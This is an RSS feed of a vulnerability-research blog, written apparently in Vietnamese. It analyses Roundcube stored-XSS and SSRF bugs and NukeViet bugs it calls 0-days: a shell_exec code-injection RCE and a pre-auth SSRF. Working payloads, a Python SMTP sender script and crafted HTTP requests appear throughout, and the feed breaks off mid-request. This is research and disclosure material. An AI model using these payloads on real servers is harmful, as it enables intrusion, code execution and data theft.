<rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
    <channel>
        <title>Cve - Tag - g03m0n</title>
        <link>https://g03m0n.github.io/tags/cve/</link>
        <description>Cve - Tag - g03m0n</description>
        <generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Thu, 09 Jul 2026 08:29:01 &#43;0800</lastBuildDate><atom:link href="https://g03m0n.github.io/tags/cve/" rel="self" type="application/rss+xml" /><item>
    <title>Roundcube 1-day Research</title>
    <link>https://g03m0n.github.io/posts/cve-2026-54433/</link>
    <pubDate>Thu, 09 Jul 2026 08:29:01 &#43;0800</pubDate>
    <author>g03m0n</author>
    <guid>https://g03m0n.github.io/posts/cve-2026-54433/</guid>
    <description><![CDATA[<h1 id="roundcube-1-day-research">Roundcube 1-day Research</h1>
<h2 id="zero-click-stored-xss-in-roundcube-cve-2026-54433">Zero-click Stored XSS in Roundcube (CVE-2026-54433)</h2>
<h3 id="description">Description</h3>
<table>
<thead>
<tr>
<th>Type</th>
<th>Verison Affected</th>
<th>Required Authentication</th>
<th>?-day</th>
</tr>
</thead>
<tbody>
<tr>
<td>Stored XSS</td>
<td>1.7.0, 1.7.1</td>
<td>Yes (User)</td>
<td>1-day</td>
</tr>
</tbody>
</table>
<h3 id="root-cause">Root cause</h3>
<p><code>program\lib\Roundcube\rcube_string_replacer.php</code></p>
<p></p>
<p>Lỗi Regex dùng để trích xuất địa chỉ email nằm ở việc sử dụng <code>\S+</code> - Non-whitespace character.</p>
<ul>
<li><code>\?</code> : Chuỗi bắt buộc bắt đầu bằng dấu <code>?</code>.</li>
<li><code>\S+</code> : Khớp với toàn bộ các ký tự miễn là không phải khoảng trắng như: dấu cách, dấu tab, xuống dòng. Dấu <code>+</code> nghĩa là kéo dài đến khi nào gặp khoảng trắng mới dừng lại.</li>
</ul>
<p>Có nghĩa là nó có thể bao gồm tất cả ký tự như <code>&lt;&gt; ' &quot; ()</code>. Bypass khoảng trắng bằng dấu <code>/</code>.</p>
<p>→ Payload: <code>a@a.co?&lt;img/src=&quot;x&quot;/onerror=alert(123)&gt;</code></p>
<p>Nơi sử dụng regex này là hàm <code>replace()</code> tại dòng 216:</p>
<p></p>
<p>Hàm <code>preg_replace_callback</code> quét chuỗi  <code>$str</code> bằng Regex <code>$this-&gt;mailto_pattern</code> và truyền các chuỗi  khớp được vào hàm <code>mailto_callback</code> để xử lý.
Đi vào hàm <code>mailto_callback()</code>:</p>
<p></p>
<p>Tại dòng 191, payload trên được gán vào biến $href và bị đưa vào hàm <code>rcube::Q()</code> để xử lý.</p>
<p>Hàm này thực chất gọi <code>htmlspecialchars</code>:</p>
<p></p>
<p>Đi vào hàm <code>parse_url_brackets()</code> tại dòng 190:</p>
<p></p>
<p></p>
<p>Hàm này có tác dụng tìm dấu <code>[ ]</code> bị thừa trong url → cắt nó ra khỏi <code>$url</code> và trả về phần thừa nằm sau dấu <code>]</code> rồi gán vào biến <code>$suffix</code> để in ra bên ngoài thẻ link thay vì dính vào trong URL.
VD:</p>
<p><code>$href = &quot;http://google.com?q=hello&quot;</code> → <code>$suffix</code> = <code>&quot;&quot;</code></p>
<p><code>$href = &quot;http://example.com]abc</code> →  <code>$suffix</code> = <code>&quot;]abc&quot;</code></p>
<p>→ Có thể bypass bằng cách chèn dấu <code>]</code> đằng sau dấu <code>?</code> trong payload để khi payload đi qua hàm này:</p>
<ul>
<li>Phần trước dấu <code>]</code> giữ lại trong <code>$href</code>: <code>a@a.co?</code></li>
<li>Phần sau dấu <code>]</code> sẽ được gán vào biến <code>$suffix</code>: <code>]&lt;img/src=&quot;x&quot;/onerror=alert(1)&gt;</code>.</li>
</ul>
<p>Phần <code>$suffix</code> sẽ không bị đi qua hàm <code>rcube::Q()</code>  mà sẽ được nối trực tiếp vào thẻ <code>a</code> tại dong 191:</p>
<p></p>
<p>→ Payload cuối: <code>a@a.co?]&lt;img/src=&quot;x&quot;/onerror=alert(123)&gt;</code></p>
<h3 id="steps-to-reproduce">Steps to reproduce</h3>
<p>Gửi email kèm payload: <code>a@a.co?]&lt;img/src=&quot;x&quot;/onerror=alert(123)&gt;</code> vào phần body của mail:</p>
<p></p>
<p>Click xem email → Triggered</p>
<p></p>
<h3 id="patch">Patch</h3>
<p></p>
<p>Ứng dụng lọc ký tự <code>&lt;&gt;</code></p>
<h2 id="stored-xss-via-mime-type-of-attachment-cve-2026-54432">Stored XSS via MIME-type of attachment (CVE-2026-54432)</h2>
<h3 id="description-1">Description</h3>
<table>
<thead>
<tr>
<th>Type</th>
<th>Version Affected</th>
<th>Required Authentication</th>
<th>?-Day</th>
</tr>
</thead>
<tbody>
<tr>
<td>Stored XSS</td>
<td>&lt; 1.7.2, &lt; 1.6.17</td>
<td>Yes (User)</td>
<td>1-day</td>
</tr>
</tbody>
</table>
<p>Lỗi xảy ra trên trang cảnh báo attachment khi MIME type khai báo trong email không khớp với nội dung thực tế. Roundcube hiển thị giá trị MIME type attacker kiểm soát trong HTML mà chưa escape đầy đủ, dẫn đến stored XSS khi nạn nhân mở attachment warning page.</p>
<h3 id="root-cause-1">Root Cause</h3>
<p>Trong <code>program/actions/mail/get.php</code>, giá trị <code>$mimetype</code> được lấy từ attachment:</p>
<p></p>
<p>Khi MIME validation fail, Roundcube đưa <code>$mimetype</code> vào biến <code>$expected</code>:</p>
<p></p>
<p>Vấn đề là chỉ phần extension được escape, còn <code>$mimetype</code> thì không. Vì vậy payload trong <code>Content-Type</code> có thể được render như HTML thật trong template:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">Expected</span><span style="color:#f92672">:</span> $expected; <span style="color:#a6e22e">found</span><span style="color:#f92672">:</span> $detected
</span></span></code></pre></div><p>Payload mẫu: <code>Content-Type: &quot;&lt;img src=x onerror=alert(1)&gt;&quot;/x; name=&quot;poc.txt&quot;</code></p>
<h3 id="steps-to-reproduce-1">Steps to Reproduce</h3>
<p>Chạy script dưới đây để gửi mail kèm attachment:</p>
<p><code>script.py</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> smtplib
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>smtp_host <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;127.0.0.1&#34;</span>
</span></span><span style="display:flex;"><span>smtp_port <span style="color:#f92672">=</span> <span style="color:#ae81ff">25</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>sender <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;flash@localhost.com&#34;</span>
</span></span><span style="display:flex;"><span>recipient <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;batman@localhost.com&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>raw <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;&#34;From: flash@localhost.com</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">To: batman@localhost.com</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Subject: Test XSS</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Date: Sat, 11 Jul 2026 00:25:00 +0700</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">MIME-Version: 1.0</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Content-Type: multipart/mixed; boundary=&#34;test&#34;</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"></span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">--test</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Content-Type: text/plain; charset=UTF-8</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Content-Transfer-Encoding: 7bit</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"></span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Experimental payload.</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"></span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">--test</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Content-Type: &#34;&lt;img src=x onerror=alert(1)&gt;&#34;/x; name=&#34;poc.txt&#34;</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Content-Disposition: inline; filename=&#34;poc2.txt&#34;</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Content-Transfer-Encoding: base64</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"></span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SGVsbG8sIHRoaXMgaXMgbm90IGFuIGltYWdlLgo=</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"></span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">--test--</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> smtplib<span style="color:#f92672">.</span>SMTP(smtp_host, smtp_port, timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">20</span>) <span style="color:#66d9ef">as</span> smtp:
</span></span><span style="display:flex;"><span>    smtp<span style="color:#f92672">.</span>ehlo()
</span></span><span style="display:flex;"><span>    smtp<span style="color:#f92672">.</span>sendmail(sender, [recipient], raw)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;sent&#34;</span>)
</span></span></code></pre></div><p>Mở warning page:</p>
<pre tabindex="0"><code>http://localhost/rc170/public_html/?_task=mail&amp;_action=get&amp;_mbox=INBOX&amp;_uid=&lt;UID&gt;&amp;_part=2&amp;_embed=1&amp;_mimewarning=1
</code></pre><p>Kết quả vulnerable:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>Expected: &lt;<span style="color:#f92672">img</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">static.php/x</span> <span style="color:#a6e22e">onerror</span><span style="color:#f92672">=</span><span style="color:#e6db74">alert(1)</span>&gt;/ (.png); found: text/plain (.txt)
</span></span></code></pre></div><p>Browser thực thi <code>alert(1)</code>.</p>
<p></p>
<h3 id="patch-1">Patch</h3>
<p></p>
<p>Sau patch, payload được render thành text:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&amp;lt;img src=x onerror=alert(1)&amp;gt;
</span></span></code></pre></div><hr>
<h2 id="bypass-url-filter-leading-to-ssrf">Bypass url filter leading to SSRF</h2>
<h3 id="description-2">Description</h3>
<table>
<thead>
<tr>
<th>Type</th>
<th>Version Affected</th>
<th>Required Authentication</th>
<th>Day</th>
</tr>
</thead>
<tbody>
<tr>
<td>SSRF</td>
<td>&lt; 1.7.2, &lt; 1.6.17</td>
<td>Yes (User)</td>
<td>1-day</td>
</tr>
</tbody>
</table>
<p>Roundcube có cơ chế fetch CSS từ xa thông qua endpoint <code>utils/modcss</code>. Trước khi fetch, URL phải được kiểm tra bằng <code>rcube_utils::is_local_url()</code>. Một số URL trỏ về local/loopback không bị nhận diện đúng, dẫn đến SSRF.</p>
<h3 id="root-cause-2">Root Cause</h3>
<p>Trong <code>program/actions/mail/index.php</code>, thẻ <code>&lt;link&gt;</code> trong email HTML được rewrite sang <code>utils/modcss</code> nếu URL không bị coi là local:</p>
<p></p>
<p>Sau đó <code>program/actions/utils/modcss.php</code> fetch URL thật bằng HTTP client server-side:</p>
<p></p>
<p>Lỗi nằm ở hàm <code>is_local_url()</code>:</p>
<p></p>
<p>Code chỉ xử lý <code>::ffff:</code> dạng ngắn và chỉ nhận diện <code>nip.io</code>, bỏ sót <code>sslip.io</code> và IPv4-mapped IPv6 dạng mở rộng.</p>
<p>Một số payload mẫu:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-markdown" data-lang="markdown"><span style="display:flex;"><span>http://127.0.0.1.sslip.io/
</span></span><span style="display:flex;"><span>http://[0:0:0:0:0:ffff:127.0.0.1]/
</span></span><span style="display:flex;"><span>http://0/
</span></span></code></pre></div><h3 id="steps-to-reproduce-2">Steps to Reproduce</h3>
<p>Host một server local:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>python -m http.server <span style="color:#ae81ff">8000</span>
</span></span></code></pre></div><p>Gửi email HTML bằng script kèm payload:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">link</span> <span style="color:#a6e22e">rel</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet&#34;</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&lt;http://127.0.0.1.sslip.io:8000/&gt;&#34;</span>&gt;
</span></span></code></pre></div><p><code>script.py</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> smtplib
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>raw <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;&#34;From: attacker@localhost.com</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">To: batman@localhost.com</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Subject: Test SSRF</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">MIME-Version: 1.0</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Content-Type: text/html; charset=UTF-8</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"></span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;!doctype html&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;html&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;head&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;link rel=&#34;stylesheet&#34; href=&#34;http://127.0.0.1.sslip.io:8000/&#34;&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;/head&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;body&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SSRF probe
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;/body&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;/html&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> smtplib<span style="color:#f92672">.</span>SMTP(<span style="color:#e6db74">&#34;127.0.0.1&#34;</span>, <span style="color:#ae81ff">25</span>) <span style="color:#66d9ef">as</span> s:
</span></span><span style="display:flex;"><span>    s<span style="color:#f92672">.</span>sendmail(<span style="color:#e6db74">&#34;flash@localhost.com&#34;</span>, [<span style="color:#e6db74">&#34;batman@localhost.com&#34;</span>], raw)
</span></span></code></pre></div><p>Mở email vừa gửi/nhận → có request đến local server:</p>
<p></p>
<h3 id="patch-2">Patch</h3>
<p>Fix:</p>
<p></p>
<p>Patch làm cho Roundcube nhận diện đúng:</p>
<pre tabindex="0"><code>127.0.0.1.sslip.io
0:0:0:0:0:ffff:127.0.0.1
0
</code></pre><p>là local URL và không đưa vào <code>$_SESSION['modcssurls']</code> để fetch server-side.</p>
]]></description>
</item>
<item>
    <title>Nukeviet 0-day Research</title>
    <link>https://g03m0n.github.io/posts/nukeviet-0-days-research/</link>
    <pubDate>Wed, 08 Jul 2026 08:31:01 &#43;0800</pubDate>
    <author>g03m0n</author>
    <guid>https://g03m0n.github.io/posts/nukeviet-0-days-research/</guid>
    <description><![CDATA[<h1 id="nukeviet-0-day-research"><strong>Nukeviet 0-day Research</strong></h1>
<h2 id="code-injection-lead-to-rce-at-seo-tool-function-in-nukeviet"><strong>Code Injection lead to RCE at SEO Tool function in nukeviet</strong></h2>
<h3 id="description">Description</h3>
<table>
<thead>
<tr>
<th><strong>Type</strong></th>
<th><strong>Version Affected</strong></th>
<th><strong>Authentication required</strong></th>
<th><strong>?-day</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>Code Injection</td>
<td>≤ 4.5.08</td>
<td>Yes (admin)</td>
<td>0-day</td>
</tr>
</tbody>
</table>
<h3 id="root-cause">Root cause</h3>
<p><strong>Source</strong></p>
<p><code>admin\seotools\robots.php</code></p>
<p></p>
<p>Hàm <code>$nv_Request-&gt;get_array('filename', 'post')</code> ở dòng 19 lấy dữ liệu từ array <code>$_POST['filename']</code> với body có dạng <code>filename[&lt;key&gt;] = &lt;value&gt;</code>.</p>
<p>Tại dòng 32, input đi qua hàm <code>serialize()</code> và gắn vào biến <code>$content_config</code></p>
<p><strong>Sink</strong></p>
<p>Tại dòng 35, data đã được serialize được đưa vào vào hàm <code>file_put_content()</code> để ghi vào file <code>/data/config/robots.php</code></p>
<p></p>
<p>Cuối cùng, tại dòng 86, file cache vừa được tạo được <code>include</code> để đọc lại cấu hình, code PHP bị nhúng bên trong sẽ lập tức được thực thi.</p>
<h3 id="steps-to-reproduce">Steps to reproduce</h3>
<p>Đăng nhập vào giao diện Admin → SEO tool → <code>Config. robots.txt</code></p>
<p></p>
<p>Kéo xuống cuối → Submit → Intercept Request và thêm payload vào cuối file
Payload: <code>&amp;filename%5b'%3b%20extract(%24_GET)%3b%20echo%20shell_exec(%24cmd)%3b%2f%2f%5d%3d1</code>
Decode: <code>&amp;filename['; extract($_GET); echo shell_exec($cmd);//]=1</code></p>
<p></p>
<p>Forward → Truy cập lại url:</p>
<p><code>http://localhost/nukeviet222/admin/index.php?language=en&amp;nv=seotools&amp;op=robots&amp;rand=t2CjiR6I&amp;cmd=&lt;command&gt;</code></p>
<p></p>
<p>File cache robots đã được ghi trên server:</p>
<p><code>data\config\robots.php</code></p>
<p></p>
<h2 id="pre-auth-ssrf-in-nukeviet"><strong>Pre-auth SSRF in nukeviet</strong></h2>
<h3 id="description-1">Description</h3>
<table>
<thead>
<tr>
<th><strong>Type</strong></th>
<th><strong>Version Affected</strong></th>
<th><strong>Authentication required</strong></th>
<th><strong>?-day</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>SSRF</td>
<td>≤ 4.5.08</td>
<td>No</td>
<td>0-day</td>
</tr>
</tbody>
</table>
<h3 id="root-cause-1">Root cause</h3>
<p><strong>Source</strong></p>
<p><code>vendor/vinades/nukeviet/Core/Server.php</code></p>
<p></p>
<p>Ứng dụng lấy thông tin từ HTTP Header <code>X-Forwarded-Host</code> (hoặc <code>HTTP_X_FORWARDED_HOST</code>) từ request và gán vào <code>$original_host</code>.</p>
<p>VD:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">GET</span> <span style="color:#f92672">/</span> <span style="color:#a6e22e">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Host</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">127.0.0.1</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">X</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Forwarded</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Host</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">attacker</span>.<span style="color:#a6e22e">com</span>
</span></span></code></pre></div><p><code>$original_host</code> = “attacker.com”</p>
<p>Tiếp theo, nếu <code>$original_host</code> !== false thì nhảy xuống hàm <code>standardizeHost()</code> để làm sạch host:</p>
<p></p>
<p>Regex này có tác dụng nhằm loại bỏ port ở cuối cùng của Host.</p>
<p><code>127.0.0.1:8080 → 127.0.0.1</code></p>
<p>Có thể bypass regex này bằng dấu gạch chéo (<code>/</code>) vào cuối host. Ví dụ <code>127.0.0.1:8081/</code>. Khi đó, chuỗi kết thúc bằng dấu <code>/</code> chứ không phải là chữ số, làm cho regex <code>(\:[0-9]+)$</code> mất tác dụng và không thể cắt bỏ được phần port.</p>
<p>→ <code>$this-&gt;original_host</code> = <code>127.0.0.1:8081/</code>.</p>
<p><strong>Sink</strong></p>
<p><code>includes/ini.php</code></p>
<p></p>
<p>Hàm <code>server_info_update()</code> có tác dụng tự động thăm dò môi trường của máy chủ Web. Nó sẽ tự gửi HTTP Request đến chính website của mình, sau đó đọc lại các HTTP Header trả về để xem server có hỗ trợ HTTP/2, HTTPS-Only, hoặc các cơ chế nén dữ liệu hay không. Từ đó cập nhật bộ nhớ đệm và <code>config_global.php</code>.</p>
<p>Để biết cần gửi request đến đâu, tại dòng 30, hàm này gọi phương thức <code>$nv_Server-&gt;getOriginalHost()</code>:</p>
<p></p>
<p>Chính là <code>original_host</code> được lấy từ header <code>X-Forwarded-Host</code> ở phía trên.</p>
<p>Tại dòng 44,  hệ thống khởi tạo hàm <code>curl_init</code> với URL được nối thẳng cùng biến <code>$host</code>  do attacker kiểm soát.</p>
<p>Tại dòng 55, ứng dụng sử dụng hàm <code>curl_exec()</code> để gửi request đến url do attacker kiểm soát.</p>
<h3 id="steps-to-reproduce-1">Steps to reproduce</h3>
<p>Gửi một POST Request đến endpoint bất kỳ kèm:</p>
<ul>
<li>
<p>Header:</p>
<p><strong>X-Forwarded-Proto: http
X-Forwarded-Host: 127.0.0.1:8081/</strong></p>
</li>
<li>
<p>Body: <code>__serverInfoUpdate=1</code></p>
</li>
</ul>
<p>Request</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">POST</span> <span style="color:#f92672">/</span><span style="color:#a6e22e">nukeviet</span><span style="color:#f92672">/</span> <span style="color:#a6e22e">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Host</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">localhost</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">sec</span><span style="color:#f92672">-</span><span style="color:#a6e22e">ch</span><span style="color:#f92672">-</span><span style="color:#a6e22e">ua</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;Chromium&#34;</span>;<span style="color:#a6e22e">v</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;127&#34;</span>, <span style="color:#e6db74">&#34;Not)A;Brand&#34;</span>;<span style="color:#a6e22e">v</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;99&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Accept</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Language</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">en</span><span style="color:#f92672">-</span><span style="color:#a6e22e">US</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">sec</span><span style="color:#f92672">-</span><span style="color:#a6e22e">ch</span><span style="color:#f92672">-</span><span style="color:#a6e22e">ua</span><span style="color:#f92672">-</span><span style="color:#a6e22e">mobile</span><span style="color:#f92672">:</span> <span style="color:#f92672">?</span><span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">User</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Agent</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">Mozilla</span><span style="color:#f92672">/</span><span style="color:#ae81ff">5.0</span> (<span style="color:#a6e22e">Windows</span> <span style="color:#a6e22e">NT</span> <span style="color:#ae81ff">10.0</span>; <span style="color:#a6e22e">Win64</span>; <span style="color:#a6e22e">x64</span>) <span style="color:#a6e22e">AppleWebKit</span><span style="color:#f92672">/</span><span style="color:#ae81ff">537.36</span> (<span style="color:#a6e22e">KHTML</span>, <span style="color:#a6e22e">like</span> <span style="color:#a6e22e">Gecko</span>) <span style="color:#a6e22e">Chrome</span><span style="color:#f92672">/</span><span style="color:#ae81ff">127.0.6533.100</span> <span style="color:#a6e22e">Safari</span><span style="color:#f92672">/</span><span style="color:#ae81ff">537.36</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">sec</span><span style="color:#f92672">-</span><span style="color:#a6e22e">ch</span><span style="color:#f92672">-</span><span style="color:#a6e22e">ua</span><span style="color:#f92672">-</span><span style="color:#a6e22e">platform</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;Windows&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Sec</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Fetch</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Site</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">same</span><span style="color:#f92672">-</span><span style="color:#a6e22e">origin</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Sec</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Fetch</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Mode</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">no</span><span style="color:#f92672">-</span><span style="color:#a6e22e">cors</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Sec</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Fetch</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Dest</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">script</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Referer</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">http</span><span style="color:#f92672">:</span><span style="color:#75715e">//localhost/nukeviet/
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">Accept</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Encoding</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">gzip</span>, <span style="color:#a6e22e">deflate</span>, <span style="color:#a6e22e">br</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">**</span><span style="color:#a6e22e">X</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Forwarded</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Proto</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">http</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">X</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Forwarded</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Host</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">127.0.0.1</span><span style="color:#f92672">:</span><span style="color:#ae81ff">8081</span><span style="color:#f92672">/**</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Connection</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">keep</span><span style="color:#f92672">-</span><span style="color:#a6e22e">alive</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Content</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Type</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">application</span><span style="color:#f92672">/</span><span style="color:#a6e22e">x</span><span style="color:#f92672">-</span><span style="color:#a6e22e">www</span><span style="color:#f92672">-</span><span style="color:#a6e22e">form</span><span style="color:#f92672">-</span><span style="color:#a6e22e">urlencoded</span>
